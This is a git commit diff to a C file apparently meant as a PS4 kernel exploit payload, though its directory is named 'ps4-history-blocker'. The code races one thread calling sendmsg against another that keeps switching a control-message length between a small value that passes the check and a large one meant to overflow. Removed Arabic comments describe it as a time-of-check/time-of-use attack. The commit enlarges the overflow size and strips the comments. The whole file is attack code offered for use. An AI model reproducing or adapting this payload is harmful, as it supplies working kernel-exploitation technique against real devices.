a8adc7f6b65a0ae56caa949f681ad892576a2b86
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2026-03-10 04:35:04 +0100

    Update main.c

--- examples/ps4-history-blocker/source/main.c
+++ examples/ps4-history-blocker/source/main.c
@@ -1,59 +1,68 @@
-#include <ps4.h> // مكتبة SDK الخاصة بالـ PS4
+#include <ps4.h>
+#include "Network.h"
 
-#define ITERATIONS 100000
+struct msghdr {
+    void         *msg_name;
+    uint32_t      msg_namelen;
+    void         *msg_iov;
+    int           msg_iovlen;
+    void         *msg_control;
+    uint32_t      msg_controllen;
+    int           msg_flags;
+};
+
+struct cmsghdr {
+    uint32_t      cmsg_len;
+    int           cmsg_level;
+    int           cmsg_type;
+};
+
+#define IP_RETOPTS 7
+#define ITERATIONS 200000
 #define CONTROL_LEN 256
 
 struct cmsghdr *cmsg;
 uint8_t control_buf[CONTROL_LEN];
-int sock;
+int global_sock;
 
-// الخيط الأول: يحاول استدعاء sendmsg باستمرار
 void *sendmsg_thread(void *arg) {
     struct msghdr msg;
     memset(&msg, 0, sizeof(msg));
-    
     msg.msg_control = control_buf;
     msg.msg_controllen = CONTROL_LEN;
 
     for (int i = 0; i < ITERATIONS; i++) {
-        // الثغرة تكمن في معالجة syscall 32-bit على نظام 64-bit
-        // في FreeBSD/PS4 نستخدم sys_sendmsg
-        syscall(28, sock, &msg, 0); 
+        syscall(28, global_sock, &msg, 0);
     }
     return NULL;
 }
 
-// الخيط الثاني: يحاول تغيير الطول بسرعة لإحداث TOCTOU
 void *race_thread(void *arg) {
     for (int i = 0; i < ITERATIONS; i++) {
-        // نغير القيمة بين حجم صغير (يجتاز الفحص) وحجم كبير (يسبب Overflow)
-        cmsg->cmsg_len = 0x50; 
-        cmsg->cmsg_len = 0xFF; 
+        cmsg->cmsg_len = 0x50;
+        cmsg->cmsg_len = 0xFFFF;
     }
     return NULL;
 }
 
-// الدالة الأساسية للـ Payload
 int _main(struct thread *td) {
-    initKernel(); // تعريف دوال النواة
-    initLibc();   // تعريف مكتبة C الأساسية
+    initKernel();
+    initLibc();
+    initNetwork();
 
-    // 1. إنشاء Socket للعمل عليه
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    global_sock = syscall(97, 2, 2, 0);
+    if (global_sock < 0) return -1;
 
-    // 2. تجهيز هيكل الـ Control Message
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
-    cmsg->cmsg_level = IPPROTO_IP;
+    cmsg->cmsg_level = 0; 
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
-    // 3. إطلاق خيوط السباق
     ScePthread thread1, thread2;
-    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "sendmsg_race");
-    scePthreadCreate(&thread2, NULL, race_thread, NULL, "modifier_race");
+    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
+    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
 
-    // 4. الانتظار
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
